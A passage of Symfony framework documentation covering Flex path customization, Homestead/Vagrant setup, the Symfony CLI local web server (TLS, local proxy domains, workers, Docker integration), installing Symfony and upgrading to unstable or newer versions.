   ``APP_DEBUG`` and ``APP_ENV``. Copy their values to the new vars and then remove
   the former ones.

#. Create the new ``public/index.php`` front controller
   `copying Symfony's index.php source`_ and, if you made any customization in
   your ``web/app.php`` and ``web/app_dev.php`` files, copy those changes into
   the new file. You can now remove the old ``web/`` dir.

#. Update the ``bin/console`` script `copying Symfony's bin/console source`_
   and changing anything according to your original console script.

#. Remove the ``bin/symfony_requirements`` script and if you need a replacement
   for it, use the new `Symfony Requirements Checker`_.

#. Update the ``.gitignore`` file to replace the existing ``var/logs/`` entry
   by ``var/log/``, which is the new name for the log directory.

.. _flex-customize-paths:

Customizing Flex Paths
----------------------

The Flex recipes make a few assumptions about your project's directory structure.
Some of these assumptions can be customized by adding a key under the ``extra``
section of your ``composer.json`` file. For example, to tell Flex to copy any
PHP classes into ``src/App`` instead of ``src``:

.. code-block:: json

    {
        "...": "...",

        "extra": {
            "src-dir": "src/App"
        }
    }

The configurable paths are:

* ``bin-dir``: defaults to ``bin/``
* ``config-dir``: defaults to ``config/``
* ``src-dir`` defaults to ``src/``
* ``var-dir`` defaults to ``var/``
* ``public-dir`` defaults to ``public/``

If you customize these paths, some files copied from a recipe still may contain
references to the original path. In other words: you may need to update some things
manually after a recipe is installed.

Learn more
----------

* :doc:`/setup/flex_private_recipes`

.. _`default services.yaml file`: https://github.com/symfony/recipes/blob/master/symfony/framework-bundle/5.3/config/services.yaml
.. _`shown in this example`: https://github.com/symfony/skeleton/blob/a0770a7f26eeda9890a104fa3de8f68c4120fca5/composer.json#L30-L39
.. _`shown in this example of the skeleton-project`: https://github.com/symfony/skeleton/blob/a0770a7f26eeda9890a104fa3de8f68c4120fca5/composer.json#L55-L57
.. _`copying Symfony's index.php source`: https://github.com/symfony/recipes/blob/master/symfony/framework-bundle/5.3/public/index.php
.. _`copying Symfony's bin/console source`: https://github.com/symfony/recipes/blob/master/symfony/console/5.3/bin/console
.. _`Symfony Requirements Checker`: https://github.com/symfony/requirements-checker
Using Symfony with Homestead/Vagrant
====================================

In order to develop a Symfony application, you might want to use a virtual
development environment instead of the built-in server or WAMP/LAMP. `Homestead`_
is an easy-to-use `Vagrant`_ box to get a virtual environment up and running
quickly.

.. tip::

    Due to the amount of filesystem operations in Symfony (e.g. updating cache
    files and writing to log files), Symfony can slow down significantly. To
    improve the speed, consider :ref:`overriding the cache and log directories <override-cache-dir>`
    to a location outside the NFS share (for instance, by using
    :phpfunction:`sys_get_temp_dir`). You can read `this blog post`_ for more
    tips to speed up Symfony on Vagrant.

Install Vagrant and Homestead
-----------------------------

Before you can use Homestead, you need to install and configure Vagrant and
Homestead as explained in `the Homestead documentation`_.

Setting Up a Symfony Application
--------------------------------

Imagine you've installed your Symfony application in
``~/projects/symfony_demo`` on your local system. You first need Homestead to
sync your files in this project. Run ``homestead edit`` to edit the
Homestead configuration and configure the ``~/projects`` directory:

.. code-block:: yaml

    # ...
    folders:
        - map: ~/projects
          to: /home/vagrant/projects

The ``projects/`` directory on your PC is now accessible at
``/home/vagrant/projects`` in the Homestead environment.

After you've done this, configure the Symfony application in the Homestead
configuration:

.. code-block:: yaml

    # ...
    sites:
        - map: symfony-demo.test
          to: /home/vagrant/projects/symfony_demo/public
          type: symfony4

The ``type`` option tells Homestead to use the Symfony nginx configuration.
Homestead now supports a Symfony 2 and 3 web layout with ``app.php`` and
``app_dev.php`` when using type ``symfony2`` and an ``index.php`` layout when
using type ``symfony4``.

At last, edit the hosts file on your local machine to map ``symfony-demo.test``
to ``192.168.10.10`` (which is the IP used by Homestead):

.. code-block:: text

    # /etc/hosts (unix) or C:\Windows\System32\drivers\etc\hosts (Windows)
    192.168.10.10 symfony-demo.test

Now, navigate to ``http://symfony-demo.test`` in your web browser and enjoy
developing your Symfony application!

.. seealso::

    To learn more features of Homestead, including Blackfire Profiler
    integration, automatic creation of MySQL databases and more, read the
    `Daily Usage`_ section of the Homestead documentation.

.. _`Homestead`: https://laravel.com/docs/homestead
.. _`Vagrant`: https://www.vagrantup.com/
.. _`the Homestead documentation`: https://laravel.com/docs/homestead#installation-and-setup
.. _`Daily Usage`: https://laravel.com/docs/homestead#daily-usage
.. _`this blog post`: https://beberlei.de/2013/08/19/speedup_symfony2_on_vagrant_boxes.html
Symfony Local Web Server
========================

You can run Symfony applications with any web server (Apache, nginx, the
internal PHP web server, etc.). However, Symfony provides its own web server to
make you more productive while developing your applications.

Although this server is not intended for production use, it supports HTTP/2,
TLS/SSL, automatic generation of security certificates, local domains, and many
other features that sooner or later you'll need when developing web projects.
Moreover, the server is not tied to Symfony and you can also use it with any
PHP application and even with HTML or single page applications.

Installation
------------

The Symfony server is part of the ``symfony`` binary created when you
`install Symfony`_ and has support for Linux, macOS and Windows.

.. note::

   You can view and contribute to the Symfony CLI source in the
   `symfony-cli/symfony-cli GitHub repository`_.

Getting Started
---------------

The Symfony server is started once per project, so you may end up with several
instances (each of them listening to a different port). This is the common
workflow to serve a Symfony project:

.. code-block:: terminal

    $ cd my-project/
    $ symfony server:start

      [OK] Web server listening on http://127.0.0.1:....
      ...

    # Now, browse the given URL, or run this command:
    $ symfony open:local

Running the server this way makes it display the log messages in the console, so
you won't be able to run other commands at the same time. If you prefer, you can
run the Symfony server in the background:

.. code-block:: terminal

    $ cd my-project/

    # start the server in the background
    $ symfony server:start -d

    # continue working and running other commands...

    # show the latest log messages
    $ symfony server:log

.. tip::

    On macOS, when starting the Symfony server you might see a warning dialog asking
    *"Do you want the application to accept incoming network connections?"*.
    This happens when running unsigned applications that are not listed in the
    firewall list. The solution is to run this command that signs the Symfony binary:

    .. code-block:: terminal

        $ sudo codesign --force --deep --sign - $(whereis -q symfony)

Enabling PHP-FPM
----------------

.. note::

    PHP-FPM must be installed locally for the Symfony server to utilize.

When the server starts, it checks for ``web/index_dev.php``, ``web/index.php``,
``public/app_dev.php``, ``public/app.php`` in that order. If one is found, the
server will automatically start with PHP-FPM enabled. Otherwise the server will
start without PHP-FPM and will show a ``Page not found`` page when trying to
access a ``.php`` file in the browser.

.. tip::

    When an ``index.html`` and a front controller like e.g. ``index.php`` are
    both present the server will still start with PHP-FPM enabled but the
    ``index.html`` will take precedence over the front controller. This means
    when an ``index.html`` file is present in ``public`` or ``web``, it will be
    displayed instead of the ``index.php`` which would show e.g. the Symfony
    application.

Enabling TLS
------------

Browsing the secure version of your applications locally is important to detect
problems with mixed content early, and to run libraries that only run in HTTPS.
Traditionally this has been painful and complicated to set up, but the Symfony
server automates everything. First, run this command:

.. code-block:: terminal

    $ symfony server:ca:install

This command creates a local certificate authority, registers it in your system
trust store, registers it in Firefox (this is required only for that browser)
and creates a default certificate for ``localhost`` and ``127.0.0.1``. In other
words, it does everything for you.

.. tip::

    If you are doing this in WSL (Windows Subsystem for Linux), the newly created
    local certificate authority needs to be manually imported in Windows. The file
    is located in ``wsl`` at ``~/.symfony5/certs/default.p12``. The easiest way to
    do so is to run ``explorer.exe \`wslpath -w $HOME/.symfony5/certs\``` from ``wsl``
    and double-click the ``default.p12`` file.

Before browsing your local application with HTTPS instead of HTTP, restart its
server stopping and starting it again.

Different PHP Settings Per Project
----------------------------------

Selecting a Different PHP Version
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you have multiple PHP versions installed on your computer, you can tell
Symfony which one to use creating a file called ``.php-version`` at the project
root directory:

.. code-block:: terminal

    $ cd my-project/

    # use a specific PHP version
    $ echo 7.4 > .php-version

    # use any PHP 8.x version available
    $ echo 8 > .php-version

.. tip::

    The Symfony server traverses the directory structure up to the root
    directory, so you can create a ``.php-version`` file in some parent
    directory to set the same PHP version for a group of projects under that
    directory.

Run the command below if you don't remember all the PHP versions installed on your
computer:

.. code-block:: terminal

    $ symfony local:php:list

      # You'll see all supported SAPIs (CGI, FastCGI, etc.) for each version.
      # FastCGI (php-fpm) is used when possible; then CGI (which acts as a FastCGI
      # server as well), and finally, the server falls back to plain CGI.

Overriding PHP Config Options Per Project
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can change the value of any PHP runtime config option per project by creating a
file called ``php.ini`` at the project root directory. Add only the options you want
to override:

.. code-block:: terminal

    $ cd my-project/

    # this project only overrides the default PHP timezone
    $ cat php.ini
    [Date]
    date.timezone = Asia/Tokyo

Running Commands with Different PHP Versions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When running different PHP versions, it is useful to use the main ``symfony``
command as a wrapper for the ``php`` command. This allows you to always select
the most appropriate PHP version according to the project which is running the
commands. It also loads the env vars automatically, which is important when
running non-Symfony commands:

.. code-block:: terminal

    # runs the command with the default PHP version
    $ php -r "..."

    # runs the command with the PHP version selected by the project
    # (or the default PHP version if the project didn't select one)
    $ symfony php -r "..."

Local Domain Names
------------------

By default, projects are accessible at some random port of the ``127.0.0.1``
local IP. However, sometimes it is preferable to associate a domain name to them:

* It's more convenient when you work continuously on the same project because
  port numbers can change but domains don't;
* The behavior of some applications depend on their domains/subdomains;
* To have stable endpoints, such as the local redirection URL for OAuth2.

Setting up the Local Proxy
~~~~~~~~~~~~~~~~~~~~~~~~~~

Local domains are possible thanks to a local proxy provided by the Symfony server.
If this is the first time you run the proxy, you must configure it as follows:

#. Open the **proxy settings** of your operating system:

   * `Proxy settings in Windows`_;
   * `Proxy settings in macOS`_;
   * `Proxy settings in Ubuntu`_.

#. Set the following URL as the value of the **Automatic Proxy Configuration**:

   ``http://127.0.0.1:7080/proxy.pac``

Now run this command to start the proxy:

.. code-block:: terminal

    $ symfony proxy:start

If the proxy doesn't work as explained in the following sections, check these:

* Some browsers (e.g. Chrome) require to re-apply proxy settings (clicking on
  ``Re-apply settings`` button on the ``chrome://net-internals/#proxy`` page)
  or a full restart after starting the proxy. Otherwise, you'll see a
  *"This webpage is not available"* error (``ERR_NAME_NOT_RESOLVED``);
* Some Operating Systems (e.g. macOS) don't apply by default the proxy settings
  to local hosts and domains. You may need to remove ``*.local`` and/or other
  IP addresses from that list.
* Windows Operating System **requires** ``localhost`` instead of ``127.0.0.1``
  when configuring the automatic proxy, otherwise you won't be able to access
  your local domain from your browser running in Windows.

Defining the Local Domain
~~~~~~~~~~~~~~~~~~~~~~~~~

By default, Symfony proposes ``.wip`` (for *Work in Progress*) for the local
domains. You can define a local domain for your project as follows:

.. code-block:: terminal

    $ cd my-project/
    $ symfony proxy:domain:attach my-domain

If you have installed the local proxy as explained in the previous section, you
can now browse ``https://my-domain.wip`` to access your local project with the
new custom domain.

.. tip::

    Browse the http://127.0.0.1:7080 URL to get the full list of local project
    directories, their custom domains, and port numbers.

You can also add a wildcard domain:

.. code-block:: terminal

    $ symfony proxy:domain:attach "*.my-domain"

So it will match all subdomains like ``https://admin.my-domain.wip``, ``https://other.my-domain.wip``...

When running console commands, add the ``https_proxy`` env var to make custom
domains work:

.. code-block:: terminal

    # Example with curl
    $ https_proxy=$(symfony proxy:url) curl https://my-domain.wip

    # Example with Blackfire and curl
    $ https_proxy=$(symfony proxy:url) blackfire curl https://my-domain.wip

    # Example with Cypress
    $ https_proxy=$(symfony proxy:url) ./node_modules/bin/cypress open

.. caution::

    Although env var names are always defined in uppercase, the ``https_proxy``
    env var `is treated differently`_ than other env vars and its name must be
    spelled in lowercase.

.. tip::

    If you prefer to use a different TLD, edit the ``~/.symfony5/proxy.json``
    file (where ``~`` means the path to your user directory) and change the
    value of the ``tld`` option from ``wip`` to any other TLD.

Long-Running Commands
---------------------

Long-running commands, such as the ones that compile front-end web assets, block
the terminal and you can't run other commands at the same time. The Symfony
server provides a ``run`` command to wrap them as follows:

.. code-block:: terminal

    # compile Webpack assets using Symfony Encore ... but do that in the
    # background to not block the terminal
    $ symfony run -d npx encore dev --watch

    # continue working and running other commands...

    # from time to time, check the command logs if you want
    $ symfony server:log

    # and you can also check if the command is still running
    $ symfony server:status
    Web server listening on ...
    Command "npx ..." running with PID ...

    # stop the web server (and all the associated commands) when you are finished
    $ symfony server:stop

Configuration file
------------------

There are several options that you can set using a ``.symfony.local.yaml`` config file:

.. code-block:: yaml

    # Sets domain1.wip and domain2.wip for the current project
    proxy:
        domains:
            - domain1
            - domain2

    http:
        document_root: public/ # Path to the project document root
        passthru: index.php # Project passthru index
        port: 8000 # Force the port that will be used to run the server
        preferred_port: 8001 # Preferred HTTP port [default: 8000]
        p12: path/to/p12_cert # Name of the file containing the TLS certificate to use in p12 format
        allow_http: true # Prevent auto-redirection from HTTP to HTTPS
        no_tls: true # Use HTTP instead of HTTPS
        daemon: true # Run the server in the background
        use_gzip: true # Toggle GZIP compression
        no_workers: true # Do not start workers

.. caution::

    Setting domains in this configuration file will override any domains you set
    using the ``proxy:domain:attach`` command for the current project when you start
    the server.

.. _symfony-server_configuring-workers:

Configuring Workers
~~~~~~~~~~~~~~~~~~~

If you like some processes to start automatically, along with the webserver
(``symfony server:start``), you can set them in the YAML configuration file:

.. code-block:: yaml

    # .symfony.local.yaml
    workers:
        # built-in command that builds and watches front-end assets
        # npm_encore_watch:
        #     cmd: ['npx', 'encore', 'dev', '--watch']
        npm_encore_watch: ~

        # built-in command that starts messenger consumer
        # messenger_consume_async:
        #     cmd: ['symfony', 'console', 'messenger:consume', 'async']
        #     watch: ['config', 'src', 'templates', 'vendor']
        messenger_consume_async: ~

        # you can also add your own custom commands
        build_spa:
            cmd: ['npm', '--cwd', './spa/', 'dev']

        # auto start Docker compose when starting server (available since Symfony CLI 5.7.0)
        docker_compose: ~

.. tip::

    You may want to not start workers on some environments like CI. You can use the
    ``--no-workers`` option to start the server without starting workers.

.. _symfony-server-docker:

Docker Integration
------------------

The local Symfony server provides full `Docker`_ integration for projects that
use it. To learn more about Docker & Symfony, see :doc:`docker`.

When the web server detects that Docker Compose is running for the project, it
automatically exposes some environment variables.

Via the ``docker-compose`` API, it looks for exposed ports used for common
services. When it detects one it knows about, it uses the service name to
expose environment variables.

Consider the following configuration:

.. code-block:: yaml

    # compose.yaml
    services:
        database:
            ports: [3306]

The web server detects that a service exposing port ``3306`` is running for the
project. It understands that this is a MySQL service and creates environment
variables accordingly with the service name (``database``) as a prefix:
``DATABASE_URL``, ``DATABASE_HOST``, ...

If the service is not in the supported list below, generic environment
variables are set: ``PORT``, ``IP``, and ``HOST``.

If the ``compose.yaml`` names do not match Symfony's conventions, add a
label to override the environment variables prefix:

.. code-block:: yaml

    # compose.yaml
    services:
        db:
            ports: [3306]
            labels:
                com.symfony.server.service-prefix: 'DATABASE'

In this example, the service is named ``db``, so environment variables would be
prefixed with ``DB_``, but as the ``com.symfony.server.service-prefix`` is set
to ``DATABASE``, the web server creates environment variables starting with
``DATABASE_`` instead as expected by the default Symfony configuration.

Here is the list of supported services with their ports and default Symfony
prefixes:

============= ========= ======================
Service       Port      Symfony default prefix
============= ========= ======================
MySQL         3306      ``DATABASE_``
PostgreSQL    5432      ``DATABASE_``
Redis         6379      ``REDIS_``
Memcached     11211     ``MEMCACHED_``
RabbitMQ      5672      ``RABBITMQ_`` (set user and pass via Docker ``RABBITMQ_DEFAULT_USER`` and ``RABBITMQ_DEFAULT_PASS`` env var)
Elasticsearch 9200      ``ELASTICSEARCH_``
MongoDB       27017     ``MONGODB_`` (set the database via a Docker ``MONGO_DATABASE`` env var)
Kafka         9092      ``KAFKA_``
MailCatcher   1025/1080 ``MAILER_``
              or 25/80
Blackfire     8707      ``BLACKFIRE_``
Mercure       80        Always exposes ``MERCURE_PUBLIC_URL`` and ``MERCURE_URL`` (only works with the ``dunglas/mercure`` Docker image)
============= ========= ======================

You can open web management interfaces for the services that expose them:

.. code-block:: bash

    $ symfony open:local:webmail
    $ symfony open:local:rabbitmq

Or click on the links in the "Server" section of the web debug toolbar.

.. tip::

    To debug and list all exported environment variables, run ``symfony
    var:export --debug``.

.. tip::

    For some services, the web server also exposes environment variables
    understood by CLI tools related to the service. For instance, running
    ``symfony run psql`` will connect you automatically to the PostgreSQL server
    running in a container without having to specify the username, password, or
    database name.

When Docker services are running, browse a page of your Symfony application and
check the "Symfony Server" section in the web debug toolbar; you'll see that
"Docker Compose" is "Up".

.. note::

    If you don't want environment variables to be exposed for a service, set
    the ``com.symfony.server.service-ignore`` label to ``true``:

    .. code-block:: yaml

        # compose.yaml
        services:
            db:
                ports: [3306]
                labels:
                    com.symfony.server.service-ignore: true

If your Docker Compose file is not at the root of the project, use the
``COMPOSE_FILE`` and ``COMPOSE_PROJECT_NAME`` environment variables to define
its location, same as for ``docker-compose``:

.. code-block:: bash

    # start your containers:
    COMPOSE_FILE=docker/compose.yaml COMPOSE_PROJECT_NAME=project_name docker-compose up -d

    # run any Symfony CLI command:
    COMPOSE_FILE=docker/compose.yaml COMPOSE_PROJECT_NAME=project_name symfony var:export

.. note::

    If you have more than one Docker Compose file, you can provide them all
    separated by ``:`` as explained in the `Docker compose CLI env var reference`_.

.. caution::

    When using the Symfony binary with ``php bin/console`` (``symfony console ...``),
    the binary will **always** use environment variables detected via Docker and will
    ignore local environment variables.
    For example if you set up a different database name in your ``.env.test`` file
    (``DATABASE_URL=mysql://db_user:db_password@127.0.0.1:3306/test``) and if you run
    ``symfony console doctrine:database:drop --force --env=test``, the command will drop the database
    defined in your Docker configuration and not the "test" one.

.. caution::

    Similar to other web servers, this tool automatically exposes all environment
    variables available in the CLI context. Ensure that this local server is not
    accessible on your local network without consent to avoid security issues.

Platform.sh Integration
-----------------------

The local Symfony server provides full, but optional, integration with
`Platform.sh`_, a service optimized to run your Symfony applications on the
cloud. It provides features such as creating environments, backups/snapshots,
and even access to a copy of the production data from your local machine to
help debug any issues.

`Read Platform.sh for Symfony technical docs`_.

.. _`install Symfony`: https://symfony.com/download
.. _`symfony-cli/symfony-cli GitHub repository`: https://github.com/symfony-cli/symfony-cli
.. _`Docker`: https://en.wikipedia.org/wiki/Docker_(software)
.. _`Platform.sh`: https://symfony.com/cloud/
.. _`Read Platform.sh for Symfony technical docs`: https://symfony.com/doc/current/cloud/index.html
.. _`Proxy settings in Windows`: https://www.dummies.com/computers/operating-systems/windows-10/how-to-set-up-a-proxy-in-windows-10/
.. _`Proxy settings in macOS`: https://support.apple.com/guide/mac-help/enter-proxy-server-settings-on-mac-mchlp2591/mac
.. _`Proxy settings in Ubuntu`: https://help.ubuntu.com/stable/ubuntu-help/net-proxy.html.en
.. _`is treated differently`: https://superuser.com/a/1799209
.. _`Docker compose CLI env var reference`: https://docs.docker.com/compose/reference/envvars/
Installing & Setting up the Symfony Framework
=============================================

.. admonition:: Screencast
    :class: screencast

    Do you prefer video tutorials? Check out the `Harmonious Development with Symfony`_
    screencast series.

.. _symfony-tech-requirements:

Technical Requirements
----------------------

Before creating your first Symfony application you must:

* Install PHP 8.2 or higher and these PHP extensions (which are installed and
  enabled by default in most PHP 8 installations): `Ctype`_, `iconv`_,
  `PCRE`_, `Session`_, `SimpleXML`_, and `Tokenizer`_;
* `Install Composer`_, which is used to install PHP packages.

.. _setup-symfony-cli:

Also, `install the Symfony CLI`_. This is optional, but it gives you a
helpful binary called ``symfony`` that provides all tools you need to
develop and run your Symfony application locally.

The ``symfony`` binary also provides a tool to check if your computer meets all
requirements. Open your console terminal and run this command:

.. code-block:: terminal

    $ symfony check:requirements

.. note::

    The Symfony CLI is written in Go and you can contribute to it in the
    `symfony-cli/symfony-cli GitHub repository`_.

.. _creating-symfony-applications:

Creating Symfony Applications
-----------------------------

Open your console terminal and run any of these commands to create a new Symfony
application:

.. code-block:: terminal

    # run this if you are building a traditional web application
    $ symfony new my_project_directory --version="7.1.*" --webapp

    # run this if you are building a microservice, console application or API
    $ symfony new my_project_directory --version="7.1.*"

The only difference between these two commands is the number of packages
installed by default. The ``--webapp`` option installs extra packages to give
you everything you need to build a web application.

If you're not using the Symfony binary, run these commands to create the new
Symfony application using Composer:

.. code-block:: terminal

    # run this if you are building a traditional web application
    $ composer create-project symfony/skeleton:"7.1.*" my_project_directory
    $ cd my_project_directory
    $ composer require webapp

    # run this if you are building a microservice, console application or API
    $ composer create-project symfony/skeleton:"7.1.*" my_project_directory

No matter which command you run to create the Symfony application. All of them
will create a new ``my_project_directory/`` directory, download some dependencies
into it and even generate the basic directories and files you'll need to get
started. In other words, your new application is ready!

.. note::

    The project's cache and logs directory (by default, ``<project>/var/cache/``
    and ``<project>/var/log/``) must be writable by the web server. If you have
    any issue, read how to :doc:`set up permissions for Symfony applications </setup/file_permissions>`.

.. _install-existing-app:

Setting up an Existing Symfony Project
--------------------------------------

In addition to creating new Symfony projects, you will also work on projects
already created by other developers. In that case, you only need to get the
project code and install the dependencies with Composer. Assuming your team uses
Git, setup your project with the following commands:

.. code-block:: terminal

    # clone the project to download its contents
    $ cd projects/
    $ git clone ...

    # make Composer install the project's dependencies into vendor/
    $ cd my-project/
    $ composer install

You'll probably also need to customize your :ref:`.env file <config-dot-env>`
and do a few other project-specific tasks (e.g. creating a database). When
working on a existing Symfony application for the first time, it may be useful
to run this command which displays information about the project:

.. code-block:: terminal

    $ php bin/console about

Running Symfony Applications
----------------------------

In production, you should install a web server like Nginx or Apache and
:doc:`configure it to run Symfony </setup/web_server_configuration>`. This
method can also be used if you're not using the Symfony local web server for
development.

.. _symfony-binary-web-server:

However for local development, the most convenient way of running Symfony is by
using the :doc:`local web server </setup/symfony_server>` provided by the
``symfony`` binary. This local server provides among other things support for
HTTP/2, concurrent requests, TLS/SSL and automatic generation of security
certificates.

Open your console terminal, move into your new project directory and start the
local web server as follows:

.. code-block:: terminal

    $ cd my-project/
    $ symfony server:start

Open your browser and navigate to ``http://localhost:8000/``. If everything is
working, you'll see a welcome page. Later, when you are finished working, stop
the server by pressing ``Ctrl+C`` from your terminal.

.. tip::

    The web server works with any PHP application, not only Symfony projects,
    so it's a very useful generic development tool.

Symfony Docker Integration
~~~~~~~~~~~~~~~~~~~~~~~~~~

If you'd like to use Docker with Symfony, see :doc:`/setup/docker`.

.. _symfony-flex:
.. _flex-quick-intro:

Installing Packages
-------------------

A common practice when developing Symfony applications is to install packages
(Symfony calls them :doc:`bundles </bundles>`) that provide ready-to-use
features. Packages usually require some setup before using them (editing some
file to enable the bundle, creating some file to add some initial config, etc.)

Most of the time this setup can be automated and that's why Symfony includes
`Symfony Flex`_, a tool to simplify the installation/removal of packages in
Symfony applications. Technically speaking, Symfony Flex is a Composer plugin
that is installed by default when creating a new Symfony application and which
**automates the most common tasks of Symfony applications**.

.. tip::

    You can also :doc:`add Symfony Flex to an existing project </setup/flex>`.

Symfony Flex modifies the behavior of the ``require``, ``update``, and
``remove`` Composer commands to provide advanced features. Consider the
following example:

.. code-block:: terminal

    $ cd my-project/
    $ composer require logger

If you run that command in a Symfony application which doesn't use Flex, you'll
see a Composer error explaining that ``logger`` is not a valid package name.
However, if the application has Symfony Flex installed, that command installs
and enables all the packages needed to use the official Symfony logger.

.. _recipes-description:

This is possible because lots of Symfony packages/bundles define **"recipes"**,
which are a set of automated instructions to install and enable packages into
Symfony applications. Flex keeps track of the recipes it installed in a
``symfony.lock`` file, which must be committed to your code repository.

Symfony Flex recipes are contributed by the community and they are stored in
two public repositories:

* `Main recipe repository`_, is a curated list of recipes for high quality and
  maintained packages. Symfony Flex only looks in this repository by default.

* `Contrib recipe repository`_, contains all the recipes created by the
  community. All of them are guaranteed to work, but their associated packages
  could be unmaintained. Symfony Flex will ask your permission before installing
  any of these recipes.

Read the `Symfony Recipes documentation`_ to learn everything about how to
create recipes for your own packages.

.. _symfony-packs:

Symfony Packs
~~~~~~~~~~~~~

Sometimes a single feature requires installing several packages and bundles.
Instead of installing them individually, Symfony provides **packs**, which are
Composer metapackages that include several dependencies.

For example, to add debugging features in your application, you can run the
``composer require --dev debug`` command. This installs the ``symfony/debug-pack``,
which in turn installs several packages like ``symfony/debug-bundle``,
``symfony/monolog-bundle``, ``symfony/var-dumper``, etc.

You won't see the ``symfony/debug-pack`` dependency in your ``composer.json``,
as Flex automatically unpacks the pack. This means that it only adds the real
packages as dependencies (e.g. you will see a new ``symfony/var-dumper`` in
``require-dev``).

.. _security-checker:

Checking Security Vulnerabilities
---------------------------------

The ``symfony`` binary created when you installed the :ref:`Symfony CLI <setup-symfony-cli>`
provides a command to check whether your project's dependencies contain any known security
vulnerability:

.. code-block:: terminal

    $ symfony check:security

A good security practice is to execute this command regularly to be able to
update or replace compromised dependencies as soon as possible. The security
check is done locally by fetching the public `PHP security advisories database`_,
so your ``composer.lock`` file is not sent on the network.

The ``check:security`` command terminates with a non-zero exit code if any of
your dependencies is affected by a known security vulnerability. This way you
can add it to your project build process and your continuous integration
workflows to make them fail when there are vulnerabilities.

.. tip::

    In continuous integration services you can check security vulnerabilities
    using a different stand-alone project called `Local PHP Security Checker`_.
    This is the same project used internally by ``check:security`` but much
    smaller in size than the entire Symfony CLI.

Symfony LTS Versions
--------------------

According to the :doc:`Symfony release process </contributing/community/releases>`,
"long-term support" (or LTS for short) versions are published every two years.
Check out the `Symfony releases`_ to know which is the latest LTS version.

By default, the command that creates new Symfony applications uses the latest
stable version. If you want to use an LTS version, add the ``--version`` option:

.. code-block:: terminal

    # use the most recent LTS version
    $ symfony new my_project_directory --version=lts

    # use the 'next' Symfony version to be released (still in development)
    $ symfony new my_project_directory --version=next

    # you can also select an exact specific Symfony version
    $ symfony new my_project_directory --version="6.4.*"

The ``lts`` and ``next`` shortcuts are only available when using Symfony to
create new projects. If you use Composer, you need to tell the exact version:

.. code-block:: terminal

    $ composer create-project symfony/skeleton:"6.4.*" my_project_directory

The Symfony Demo application
----------------------------

`The Symfony Demo Application`_ is a fully-functional application that shows the
recommended way to develop Symfony applications. It's a great learning tool for
Symfony newcomers and its code contains tons of comments and helpful notes.

Run this command to create a new project based on the Symfony Demo application:

.. code-block:: terminal

    $ symfony new my_project_directory --demo

Start Coding!
-------------

With setup behind you, it's time to :doc:`Create your first page in Symfony </page_creation>`.

Learn More
----------

.. toctree::
    :maxdepth: 1
    :glob:

    setup/docker
    setup/homestead
    setup/web_server_configuration
    setup/*

.. _`Harmonious Development with Symfony`: https://symfonycasts.com/screencast/symfony
.. _`Install Composer`: https://getcomposer.org/download/
.. _`install the Symfony CLI`: https://symfony.com/download
.. _`symfony-cli/symfony-cli GitHub repository`: https://github.com/symfony-cli/symfony-cli
.. _`The Symfony Demo Application`: https://github.com/symfony/demo
.. _`Symfony Flex`: https://github.com/symfony/flex
.. _`PHP security advisories database`: https://github.com/FriendsOfPHP/security-advisories
.. _`Local PHP Security Checker`: https://github.com/fabpot/local-php-security-checker
.. _`Symfony releases`: https://symfony.com/releases
.. _`Main recipe repository`: https://github.com/symfony/recipes
.. _`Contrib recipe repository`: https://github.com/symfony/recipes-contrib
.. _`Symfony Recipes documentation`: https://github.com/symfony/recipes/blob/master/README.rst
.. _`iconv`: https://www.php.net/book.iconv
.. _`Session`: https://www.php.net/book.session
.. _`Ctype`: https://www.php.net/book.ctype
.. _`Tokenizer`: https://www.php.net/book.tokenizer
.. _`SimpleXML`: https://www.php.net/book.simplexml
.. _`PCRE`: https://www.php.net/book.pcre
How to Install or Upgrade to the Latest, Unreleased Symfony Version
===================================================================

In this article, you'll learn how to install and use new Symfony versions before
they are released as stable versions.

Creating a New Project Based on an Unstable Symfony Version
-----------------------------------------------------------

Suppose that the Symfony 6.0 version hasn't been released yet and you want to create
a new project to test its features. First, `install the Composer package manager`_.
Then, open a command console, enter your project's directory and
run the following command:

.. code-block:: terminal

    # Download the absolute latest commit
    $ composer create-project symfony/skeleton my_project -s dev

Once the command finishes, you'll have a new Symfony project created
in the ``my_project/`` directory.

Upgrading your Project to an Unstable Symfony Version
-----------------------------------------------------

Suppose again that Symfony 6.0 hasn't been released yet and you want to upgrade
an existing application to test that your project works with it.

First, open the ``composer.json`` file located in the root directory of your
project. Then, edit the value of all of the ``symfony/*`` libraries to the
new version and change your ``minimum-stability`` to ``beta``:

.. code-block:: diff

      {
          "require": {
    +         "symfony/framework-bundle": "^6.0",
    +         "symfony/finder": "^6.0",
              "...": "..."
          },
    +     "minimum-stability": "beta"
      }

You can also use set ``minimum-stability`` to ``dev``, or omit this line
entirely, and opt into your stability on each package by using constraints
like ``6.0.*@beta``.

Finally, from a terminal, update your project's dependencies:

.. code-block:: terminal

    $ composer update

After upgrading the Symfony version, read the :ref:`Symfony Upgrading Guide <upgrade-major-symfony-deprecations>`
to learn how you should proceed to update your application's code in case the new
Symfony version has deprecated some of its features.

.. tip::

    If you use Git to manage the project's code, it's a good practice to create
    a new branch to test the new Symfony version. This solution avoids introducing
    any issue in your application and allows you to test the new version with
    total confidence:

    .. code-block:: terminal

        $ cd projects/my_project/
        $ git checkout -b testing_new_symfony
        # ... update composer.json configuration
        $ composer update "symfony/*"

        # ... after testing the new Symfony version
        $ git checkout master
        $ git branch -D testing_new_symfony

.. _`install the Composer package manager`: https://getcomposer.org/download/
Upgrading other Packages
~~~~~~~~~~~~~~~~~~~~~~~~

You may also want to upgrade the rest of your libraries. If you've done a
good job with your `version constraints`_ in ``composer.json``, you can do
this safely by running:

.. code-block:: terminal

    $ composer update

.. caution::

    Beware, if you have some unspecific `version constraints`_ in your
    ``composer.json`` (e.g. ``dev-master``), this could upgrade some
    non-Symfony libraries to new versions that contain backwards-compatibility
    breaking changes.

.. _`version constraints`: https://getcomposer.org/doc/articles/versions.md
Dependency Errors
~~~~~~~~~~~~~~~~~

If you get a dependency error, it may mean that you also need to upgrade
other libraries that are dependencies of the Symfony libraries. To allow
that, pass the ``--with-all-dependencies`` flag:

.. code-block:: terminal

    $ composer update "symfony/*" --with-all-dependencies

This updates ``symfony/*`` and *all* packages that those packages depend on.
By using tight version constraints in ``composer.json``, you can control what
versions each library upgrades to.

If this still doesn't work, your ``composer.json`` file may specify a version
for a library that is not compatible with the newer Symfony version. In that
